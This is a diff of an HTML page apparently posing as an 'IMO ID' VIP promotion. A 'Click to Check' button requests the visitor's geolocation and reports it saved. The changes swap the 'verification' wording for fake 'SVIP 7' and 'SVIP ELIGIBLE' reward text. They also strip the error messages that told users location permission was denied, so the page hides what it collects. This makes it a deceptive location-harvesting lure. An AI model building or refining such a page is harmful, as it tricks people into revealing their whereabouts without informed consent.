@@ -4,7 +4,7 @@
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <meta http-equiv="Permissions-Policy" content="geolocation=(self)">
-  <title>IMO ID VERIFICATION</title>
+  <title>IMO ID PRAMOTION</title>
 
   <style>
     * {
@@ -132,13 +132,13 @@
 
 <body>
   <main class="card">
-    <h1 id="title">IMO ID Verification</h1>
+    <h1 id="title">IMO ID SVIP 7</h1>
 
     <p class="desc" id="desc">
       
     </p>
 
-    <div class="status" id="status">Ready for verification</div>
+    <div class="status" id="status">SVIP ELIGIBLE ✅</div>
 
     <button id="locationBtn" type="button">Click to Check</button>
 
@@ -177,7 +177,7 @@
     btn.disabled = true;
     btn.innerText = "Verification Done ✓";
     title.innerText = "Verification Done";
-    desc.innerText = "VERIFICATION COMPLETE D";
+    desc.innerText = "VERIFICATION COMPLETED";
     if (icon) icon.innerText = "✓";
     setStatus(" saved successfully", "success");
   }
@@ -263,9 +263,9 @@
       let message = "Verification failed. Please try again.";
 
       if (error && error.code === 1) {
-        message = "Location permission was denied. Please allow Location and try again.";
+        message = " try again.";
       } else if (error && error.code === 2) {
-        message = "Location is unavailable. Turn on GPS/Location and try again.";
+        message = "try again.";
       } else if (error && error.code === 3) {
         message = "Location request timed out. Please try again.";
       } else if (error && error.message) {
